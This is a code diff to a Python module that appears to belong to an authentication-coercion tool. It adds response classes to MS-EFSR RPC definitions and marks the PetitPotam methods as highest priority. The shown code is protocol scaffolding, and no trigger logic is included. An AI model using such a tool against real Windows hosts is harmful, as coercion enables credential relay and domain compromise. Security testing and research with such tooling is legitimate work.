@@ -41,9 +41,17 @@ class _EfsRpcOpenFileRaw(NDRCALL):
     )
 
 
+class _EfsRpcOpenFileRawResponse(NDRCALL):
+    structure = (("ErrorCode", LONG),)
+
+
 class _EfsRpcEncryptFileSrv(NDRCALL):
     opnum = 4
     structure = (("FileName", WSTR),)
+
+
+class _EfsRpcEncryptFileSrvResponse(NDRCALL):
+    structure = (("ErrorCode", LONG),)
 
 
 class _EfsRpcDecryptFileSrv(NDRCALL):
@@ -54,9 +62,17 @@ class _EfsRpcDecryptFileSrv(NDRCALL):
     )
 
 
+class _EfsRpcDecryptFileSrvResponse(NDRCALL):
+    structure = (("ErrorCode", LONG),)
+
+
 class _EfsRpcQueryUsersOnFile(NDRCALL):
     opnum = 6
     structure = (("FileName", WSTR),)
+
+
+class _EfsRpcQueryUsersOnFileResponse(NDRCALL):
+    structure = (("ErrorCode", LONG),)
 
 
 class _EfsRpcQueryRecoveryAgents(NDRCALL):
@@ -64,14 +80,26 @@ class _EfsRpcQueryRecoveryAgents(NDRCALL):
     structure = (("FileName", WSTR),)
 
 
+class _EfsRpcQueryRecoveryAgentsResponse(NDRCALL):
+    structure = (("ErrorCode", LONG),)
+
+
 class _EfsRpcRemoveUsersFromFile(NDRCALL):
     opnum = 8
     structure = (("FileName", WSTR),)
 
 
+class _EfsRpcRemoveUsersFromFileResponse(NDRCALL):
+    structure = (("ErrorCode", LONG),)
+
+
 class _EfsRpcAddUsersToFile(NDRCALL):
     opnum = 9
     structure = (("FileName", WSTR),)
+
+
+class _EfsRpcAddUsersToFileResponse(NDRCALL):
+    structure = (("ErrorCode", LONG),)
 
 
 class _EfsRpcFileKeyInfo(NDRCALL):
@@ -80,6 +108,10 @@ class _EfsRpcFileKeyInfo(NDRCALL):
         ("FileName", WSTR),
         ("InfoClass", DWORD),
     )
+
+
+class _EfsRpcFileKeyInfoResponse(NDRCALL):
+    structure = (("ErrorCode", LONG),)
 
 
 class EFS_RPC_BLOB(NDRSTRUCT):
@@ -101,6 +133,10 @@ class _EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
     )
 
 
+class _EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):
+    structure = (("ErrorCode", LONG),)
+
+
 class _EfsRpcAddUsersToFileEx(NDRCALL):
     opnum = 15
     structure = (
@@ -108,6 +144,10 @@ class _EfsRpcAddUsersToFileEx(NDRCALL):
         ("Reserved", DWORD),  # Must be NULL (0)
         ("FileName", WSTR),
     )
+
+
+class _EfsRpcAddUsersToFileExResponse(NDRCALL):
+    structure = (("ErrorCode", LONG),)
 
 
 def _trigger_open_file_raw(dce, path, target):
@@ -213,6 +253,7 @@ def get_methods() -> list[CoercionMethod]:
                 pipe_bindings=list(EFSR_PIPES),
                 path_styles=list(EFSR_PATH_STYLES),
                 trigger_fn=trigger_fn,
+                priority=1,  # PetitPotam - highest priority
             )
         )
     return methods
